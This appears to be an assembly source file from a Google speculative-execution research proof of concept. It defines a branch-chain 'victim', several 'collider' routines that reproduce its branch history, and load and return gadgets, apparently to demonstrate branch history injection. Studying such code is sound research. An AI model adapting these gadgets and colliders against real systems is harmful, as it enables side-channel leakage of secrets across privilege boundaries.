;Copyright 2025 Google LLC
;
;Licensed under the Apache License, Version 2.0 (the "License");
;you may not use this file except in compliance with the License.
;You may obtain a copy of the License at
;
;    https://www.apache.org/licenses/LICENSE-2.0
;
;Unless required by applicable law or agreed to in writing, software
;distributed under the License is distributed on an "AS IS" BASIS,
;WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
;See the License for the specific language governing permissions and
;limitations under the License.

%define MAX_HISTORY_SIZE 128
%define nop8 db 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00



section .text

%macro SLOW_RSI_CALL_THEN_RET 0
    push    rsi
    clflush [rsp]
    mfence
	lfence

    call    [rsp]

    add     rsp, 8
    ret
    int3
%endmacro

; Note: This code is fairly offset-sensitive. Don't change it if you don't
; need to (includes changing MAX_HISTORY_SIZE - 128 and 300 are confirmed
; to work ok, 256 does not!)
; Maybe caused by some branches being aligned such that BHB xors out to
; a bad state.
%macro BRANCH_CHAIN 0
    ; N branches chain.
    %assign i 0
    %rep MAX_HISTORY_SIZE
    movzx   rax, byte [rdi]
    inc     rdi
    cmp     rax, 1
    je      %%ind_call_hit_%+i
    ;nop
    %%ind_call_hit_%+i:
    %assign i i+1
    %endrep

    mov     rdi, rdx
    SLOW_RSI_CALL_THEN_RET
%endmacro

; start of actual code.

align 0x1000
global victim
victim:
    BRANCH_CHAIN

align 0x1000
    ; We shouldn't be able to control alignment of the two calls.
    %rep 123
	nop
	%endrep
global out_of_place_chain_collider
out_of_place_chain_collider:
    BRANCH_CHAIN



align 0x1000
    ; We shouldn't be able to control alignment of the two calls.
    %rep 123
	nop
	%endrep

global out_of_place_for_if_collider
out_of_place_for_if_collider:
    ; for (i<N) if (h[i]) {}
	mov rcx, MAX_HISTORY_SIZE

	collider_for:
	nop
	nop
	nop
		movzx   rax, byte [rdi]
		inc     rdi
		cmp     rax, 1
		je collider_over
		nop
		collider_over:

		dec rcx
		cmp rcx, 0
		jne collider_for

    mov     rdi, rdx
    SLOW_RSI_CALL_THEN_RET

global out_of_place_quad_for_if_collider
out_of_place_quad_for_if_collider:
    ; for (i<N) if (h[i]) {} x4
	mov rcx, MAX_HISTORY_SIZE

	collider_for_quad:
	nop
	nop
	nop
		movzx   rax, byte [rdi]
		inc     rdi
		cmp     rax, 1
		je collider_over1
		nop
		collider_over1:
		movzx   rax, byte [rdi]
		inc     rdi
		cmp     rax, 1
		je collider_over2
		nop
		collider_over2:
		movzx   rax, byte [rdi]
		inc     rdi
		cmp     rax, 1
		je collider_over3
		nop
		collider_over3:
		movzx   rax, byte [rdi]
		inc     rdi
		cmp     rax, 1
		je collider_over4
		nop
		collider_over4:

		dec rcx
		dec rcx
		dec rcx
		dec rcx
		cmp rcx, 0
		jne collider_for_quad

    mov     rdi, rdx
    SLOW_RSI_CALL_THEN_RET

global ret_gadget
ret_gadget:
    ret
	int3

global hit_gadget
hit_gadget:
    mov     rax, [rdi]
    ret
	int3

